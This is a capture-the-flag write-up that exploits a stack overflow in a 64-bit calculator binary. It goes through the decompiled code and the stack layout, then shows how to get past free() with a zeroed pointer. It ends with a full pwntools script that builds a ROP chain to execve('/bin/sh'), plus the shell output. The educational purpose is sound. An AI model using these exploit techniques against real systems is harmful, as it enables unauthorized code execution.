# Simple Calc

This writeup is based off of this other writeup:

```
http://hexfact0r.dk/2016/03/06/boston-key-party-ctf-2016-simple-calc/
```

Let's take a look at the binary:
```
$	file b28b103ea5f1171553554f0127696a18c6d2dcf7 
b28b103ea5f1171553554f0127696a18c6d2dcf7: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, for GNU/Linux 2.6.24, BuildID[sha1]=3ca876069b2b8dc3f412c6205592a1d7523ba9ea, not stripped
$	pwn checksec b28b103ea5f1171553554f0127696a18c6d2dcf7 
[*] '/Hackery/bkp16/simple-calc/b28b103ea5f1171553554f0127696a18c6d2dcf7'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

So we are dealing with a 64 bit elf, with a Non-Executable stack. Let's see what happens when we run the program:
```
$	./b28b103ea5f1171553554f0127696a18c6d2dcf7 

	|#------------------------------------#|
	|         Something Calculator         |
	|#------------------------------------#|

Expected number of calculations: 20
Options Menu: 
 [1] Addition.
 [2] Subtraction.
 [3] Multiplication.
 [4] Division.
 [5] Save and Exit.
=> 1
Integer x: 50
Integer y: 96
Result for x + y is 146.

Options Menu: 
 [1] Addition.
 [2] Subtraction.
 [3] Multiplication.
 [4] Division.
 [5] Save and Exit.
=> 2
Integer x: 75
Integer y: 42
Result for x - y is 33.

Options Menu: 
 [1] Addition.
 [2] Subtraction.
 [3] Multiplication.
 [4] Division.
 [5] Save and Exit.
=> 3
Integer x: 216
Integer y: 521
Result for x * y is 112536.

Options Menu: 
 [1] Addition.
 [2] Subtraction.
 [3] Multiplication.
 [4] Division.
 [5] Save and Exit.
=> 4
Integer x: 2000
Integer y: 69
Result for x / y is 28.

Options Menu: 
 [1] Addition.
 [2] Subtraction.
 [3] Multiplication.
 [4] Division.
 [5] Save and Exit.
=> 5
Segmentation fault (core dumped)
```

So we can see that this is a calculator, that first prompts us for the number The calculations it will permit are Addition, Subtraction, Multiplication, and Division. It also gives us the abillity to `Save and Exit` which we apparantly crashed the program doing. Let's take a look at the code in IDA:

```
int __cdecl main(int argc, const char **argv, const char **envp)
{
  void *v3; // rdi@1
  int result; // eax@3
  const char *v5; // rdi@4
  char *heap_pointer; // rax@4
  char vuln_char[40]; // [sp+10h] [bp-40h]@14
  int menu_input; // [sp+38h] [bp-18h]@5
  int number_calcs; // [sp+3Ch] [bp-14h]@1
  char *heap_pointer_transfer; // [sp+40h] [bp-10h]@4
  int i; // [sp+4Ch] [bp-4h]@4

  number_calcs = 0;
  setvbuf(stdin, 0LL, 2LL, 0LL);
  v3 = stdout;
  setvbuf(stdout, 0LL, 2LL, 0LL);
  print_motd(v3);
  printf((unsigned __int64)"Expected number of calculations: ");
  _isoc99_scanf((unsigned __int64)"%d");
  handle_newline("%d", &number_calcs);
  if ( number_calcs <= 255 && number_calcs > 3 )
  {
    v5 = (const char *)(4 * number_calcs);
    LODWORD(heap_pointer) = malloc(v5);
    heap_pointer_transfer = heap_pointer;
    for ( i = 0; i < number_calcs; ++i )
    {
      print_menu(v5);
      v5 = "%d";
      _isoc99_scanf((unsigned __int64)"%d");
      handle_newline("%d", &menu_input);
      switch ( menu_input )
      {
        case 1:
          adds("%d");
          *(_DWORD *)&heap_pointer_transfer[4 * i] = dword_6C4A88;
          break;
        case 2:
          subs("%d");
          *(_DWORD *)&heap_pointer_transfer[4 * i] = dword_6C4AB8;
          break;
        case 3:
          muls("%d");
          *(_DWORD *)&heap_pointer_transfer[4 * i] = dword_6C4AA8;
          break;
        case 4:
          divs("%d");
          *(_DWORD *)&heap_pointer_transfer[4 * i] = dword_6C4A98;
          break;
        default:
          if ( menu_input == 5 )
          {
            memcpy(vuln_char, heap_pointer_transfer, 4 * number_calcs);
            free(heap_pointer_transfer);
            return 0;
          }
          v5 = "Invalid option.\n";
          puts("Invalid option.\n");
          break;
      }
    }
    free(heap_pointer_transfer);
    result = 0;
  }
  else
  {
    puts("Invalid number.");
    result = 0;
  }
  return result;
}
```

So looking at this code, we can see a couple of things. First it does indeed do what we thought with prompting us for the amount of calculations, then it allocates a space in the heap equivalent to `4 * number_of_calcs`.  Then it proceeds to do the calculations, and stores each of them as a four byte int in the heap space. When we save and exit, we can see that it uses `memcpy` to copy the output data from the calculations over to `vuln_char` without checking the size. This is a buffer overflow bug. Let's take a look at the stack (also keep in mind the `heap_pointer_transfer` argument in `free` on the next line):

```
-0000000000000050 var_50          dq ?
-0000000000000048                 db ? ; undefined
-0000000000000047                 db ? ; undefined
-0000000000000046                 db ? ; undefined
-0000000000000045                 db ? ; undefined
-0000000000000044 var_44          dd ?
-0000000000000040 vuln_char       db 40 dup(?)
-0000000000000018 menu_input      dd ?
-0000000000000014 number_calcs    dd ?
-0000000000000010 heap_pointer_transfer dq ?              ; offset
-0000000000000008                 db ? ; undefined
-0000000000000007                 db ? ; undefined
-0000000000000006                 db ? ; undefined
-0000000000000005                 db ? ; undefined
-0000000000000004 var_4           dd ?
+0000000000000000  s              db 8 dup(?)
+0000000000000008  r              db 8 dup(?)
``` 

So our input is starting at `rbp-0x40`, and we will be writing untill we reach the return address located at `rbp+0x8`, so we will need to write 0x48 (72) bytes in order to reach the return address. This means that we will need to make 18 calculations (18 * 4 = 72) before we reach the return address. Looking inbetween `vuln_char` and the return address, we can see that `heap_pointer_transfer` is overwritten. This is a problem since it is used in a free call imediately after `memcpy`, and if it isn't an acceptable argument that program will crash before we get code execution.  Luckily for us, there is a way around this.

Looking at the beginning assembly code for `free`, we can see the following:
```
.text:00000000004156D0                 mov     rax, cs:__free_hook
.text:00000000004156D7                 test    rax, rax
.text:00000000004156DA                 jnz     loc_41579A
.text:00000000004156E0                 test    rdi, rdi
.text:00000000004156E3                 jz      locret_415798
```

The argument to free is stored in the `rdi` register. That test instruction should only output zero, if the argument is null. And when we see where it jumps to if the argument is null `0x415798`:

```
.text:0000000000415798 locret_415798:                          ; CODE XREF: free+13j
.text:0000000000415798                 rep retn
```

So we can see, that if the argument is null, free just returns. So if we overwrite the pointer with null bytes, `free` will just check to see if it is null and return, thus it won't crash the binary. Now looking for what we can do with our code execution, we can see that there are no useful plt function that we can call, so we will have to form a ROP Chain which will make a syscall to `execve("/bin/sh",NULL,NULL)` (the last two arguments for execve are argv and envp, which passes the input strings and enviorment variables to the running file, thus since we don't need them we can just set them to NULL). The first thing we need to figure out, we will need to write the string `"/bin/sh"` somewhere in memory with an address we know so we can find it. In gdb, we can find an area of memory we can write to:

```
gdb-peda$ vmmap
Start              End                Perm	Name
0x00400000         0x004c1000         r-xp	/Hackery/bkp16/simple-calc/b28b103ea5f1171553554f0127696a18c6d2dcf7
0x006c0000         0x006c3000         rw-p	/Hackery/bkp16/simple-calc/b28b103ea5f1171553554f0127696a18c6d2dcf7
0x006c3000         0x006e9000         rw-p	[heap]
0x00007ffff7ffb000 0x00007ffff7ffd000 r--p	[vvar]
0x00007ffff7ffd000 0x00007ffff7fff000 r-xp	[vdso]
0x00007ffffffde000 0x00007ffffffff000 rw-p	[stack]
0xffffffffff600000 0xffffffffff601000 r-xp	[vsyscall]
```

We can see here, the area of memory located at `0x6c0000` is readable, writeable, and it remains with a static address with each instance of the program. This will be the perfect place to write it. Next we will need to find a way to write `"/bin/sh"`, which we can do with a ROP gadget:

```
$	python ROPgadget.py --binary b28b103ea5f1171553554f0127696a18c6d2dcf7 | grep 44526e
0x000000000044526e : mov qword ptr [rax], rdx ; ret
```

Here we can see is a ROP gadget which will allow us to do a write what where and return. So we can write the value stored in the `rdx` register to the area of memory stored in the `rdx` register. This will allow us to write `"/bin/sh"` to `0x6c0000`. Now we just need ROPgadgets which will pop values into the `rdx`, `rax`, `rdi`, and `rsi` registers (The arguments for `execve` are stored in the `rdi`, `rdx`, and `rsi` registers) and return so we can continue the ROP Chain:

```
$	python ROPgadget.py --binary b28b103ea5f1171553554f0127696a18c6d2dcf7 | grep ": pop rdx ; ret"$
0x0000000000437a85 : pop rdx ; ret
$	python ROPgadget.py --binary b28b103ea5f1171553554f0127696a18c6d2dcf7 | grep ": pop rax ; ret"$
0x000000000044db34 : pop rax ; ret
$	python ROPgadget.py --binary b28b103ea5f1171553554f0127696a18c6d2dcf7 | grep ": pop rdi ; ret"$
0x0000000000401b73 : pop rdi ; ret
$	python ROPgadget.py --binary b28b103ea5f1171553554f0127696a18c6d2dcf7 | grep ": pop rsi ; ret"$
0x0000000000401c87 : pop rsi ; ret
```

The last ROP gadget we will need is to find the address of a `syscall` which we can use objdump for:

```
$	objdump -D b28b103ea5f1171553554f0127696a18c6d2dcf7 | grep syscall
  400488:	0f 05                	syscall 
  401857:	0f 05                	syscall 
  401a9b:	0f 05                	syscall 
  40393a:	0f 05                	syscall 
  403b0d:	0f 05                	syscall 
  404668:	0f 05                	syscall 
  40956e:	0f 05                	syscall 
  4097dc:	0f 05                	syscall 
  41246b:	0f 05                	syscall 
  4341a6:	0f 05                	syscall 
  4341b7:	0f 05                	syscall 
  43434e:	0f 05                	syscall 
  4343c4:	0f 05                	syscall 
  4349b5:	0f 05                	syscall 
```

The list continues on, but we have what we need here. Although they have different addresses, they all point to the same op code or instruction, so they all do the same thing (meaning we should be able to use any of them). I used `0x400488`. So quick overview of what our payload and ROP Chain is going to be:

```
72 bytes of null data:	reach return address and cause free not to crash

pop_rax gadget:	load memory address into the rax register, to write "/bin/sh" to it and return
memory address:	This is here so the pop_rax gadget will pop this into the rax register
pop_rdx gadget:	load the string "/bin/sh" into the rdx register so it can be written to
"/bin/sh"	  : The string is here so the pop_rdx gadget can pop it
write gadget  : Write the contents of the rdx register to the memory pointed to by the rax register, thus writing "/bin/sh" to 0x6c0000

pop_rdi gadget:	pop the memory address pointing to "/bin/sh" into the rdi register to be used as an argument for execve
memory address:	This is here so the pop_rdi gadget will pop this into the rdx register
pop_rdx gadget:	pop 8 bytes of null data into the rdx register, to be used as an argument for execve
null value    : 8 Bytes of NULL data which will be popped into the rdx register
pop_rsi gadget:	pop 8 bytes of null data into the rsi register, to be used as an argument for execve
null value    : 8 Bytes of NULL data which will be popped into the rsi register
pop_rax gadget: Pop the syscall number for execve() into the rax register, so syscall will no to run execve()
0x3b          : This is the syscall number which points to execve()
syscall       : Call syscall which will run execve("/bin/sh", NULL, NULL) and give us a shell
```

Puttting it all together, we get this python exploit:

```
#Import pwntools
from pwn import *

#Establish the target
target = process('./b28b103ea5f1171553554f0127696a18c6d2dcf7')
#gdb.attach(target, gdbscript = 'b *0x401545')

#Establish ROP gadgets
pop_rdi = p64(0x401b73)
pop_rsi = p64(0x401c87)
pop_rax = p64(0x44db34)
pop_rdx = p64(0x437a85)

#Establsih other needed values for the ROP Chain
write_gadget = p64(0x44526e)
syscall = p64(0x400488)
binsh0 = p64(0x6e69622f)
binsh1 = p64(0x0068732f)
space = p64(0x6c0000)
zero = p64(0x0)

#Establish the function which will handle the start
def start():
	print target.recvuntil("Expected number of calculations: ")	
	target.sendline('50')
	print target.recvuntil('=>')

#This function will write a 4 byte null value in memory
def null_sub():
	target.sendline("2")
	target.sendline("486")
	target.sendline("486")
	print target.recvuntil("=>")


#This function exits the program, thus allowing us to gain rce
def exit():
	target.sendline("5")

#This function will write packed hex arguments we pass to it in memory using Addition
def write(hex_arg):
	hex = u64(hex_arg)
	target.sendline("1")
	target.sendline(str(hex - 100))
	target.sendline("100")
	print target.recvuntil("=>")
	null_sub()

#Because the string "/bin/sh\x00" actually requires the use of the upper 4 bytes unlike everything else, this is a modified write function which will write that for us
def write_binsh(hex_arg):
	hex = u64(hex_arg)
	target.sendline("1")
	target.sendline(str(hex - 100))
	target.sendline("100")
	print target.recvuntil("=>")

#RUn the start of the program, and write null bytes up untill the return address
start()
for i in xrange(18):
	print i
	null_sub()

#Write the part of the ROP Chain which will write "/bin/sh" to 0x6c0000
write(pop_rax)
write(space)
write(pop_rdx)
write_binsh(binsh0)
write_binsh(binsh1)
write(write_gadget)

#Write the part of the ROP Chain which will make the syscall to execve('/bin/sh', NULL, NULL)
write(pop_rdi)
write(space)
write(pop_rdx)
write(zero)
write(pop_rsi)
write(zero)
write(pop_rax)
write(p64(0x3b))
write(syscall)

#Exit the program so our ROP Chain will run
exit()

#Drop to an interactive shell
target.interactive()
```

and when we run it:

```
$	python exploit.py 
[+] Starting local process './b28b103ea5f1171553554f0127696a18c6d2dcf7': pid 23609

    |#------------------------------------#|
    |         Something Calculator         |
    |#------------------------------------#|

```

one wall of text later...

```
[*] Switching to interactive mode
 $ w
 00:03:11 up  9:55,  1 user,  load average: 0.71, 0.72, 0.79
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
guyinatu tty7     :0               Sun06   17:54m 18:39   0.02s /bin/sh /usr/lib/gnome-session/run-systemd-session ubuntu-session.target
$ ls
Readne.md
b28b103ea5f1171553554f0127696a18c6d2dcf7
core
exploit.py
peda-session-b28b103ea5f1171553554f0127696a18c6d2dcf7.txt
ropout
try.py
url
$  
```

Just like that, we popped a shell!

